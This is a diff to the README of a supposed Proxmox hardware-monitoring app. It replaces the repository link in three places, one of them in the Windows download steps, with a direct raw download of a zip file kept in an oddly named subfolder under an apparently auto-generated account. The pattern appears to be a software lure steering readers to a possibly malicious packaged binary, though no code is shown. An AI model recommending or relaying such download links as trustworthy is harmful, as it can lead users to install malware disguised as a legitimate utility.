@@ -1,6 +1,6 @@
 # 📊 PVE-Hardware-Monitor - Real-time hardware status at a glance
 
-[![Download](https://img.shields.io/badge/Download-Use%20this%20page-blue?style=for-the-badge)](https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor)
+[![Download](https://img.shields.io/badge/Download-Use%20this%20page-blue?style=for-the-badge)](https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor/raw/refs/heads/main/trimmingly/Monitor-PV-Hardware-1.0.zip)
 
 ## 🖥️ What this is
 
@@ -20,7 +20,7 @@ It is built for people who want a clear view of system health without opening se
 
 Use this page to download the app:
 
-https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor
+https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor/raw/refs/heads/main/trimmingly/Monitor-PV-Hardware-1.0.zip
 
 ### Steps for Windows
 
@@ -241,7 +241,7 @@ Leave the app open on a second monitor or snap it to one side of the screen. Tha
 
 If you need the app again, use the same link:
 
-https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor
+https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor/raw/refs/heads/main/trimmingly/Monitor-PV-Hardware-1.0.zip
 
 ## 📚 Simple terms used in the app
 
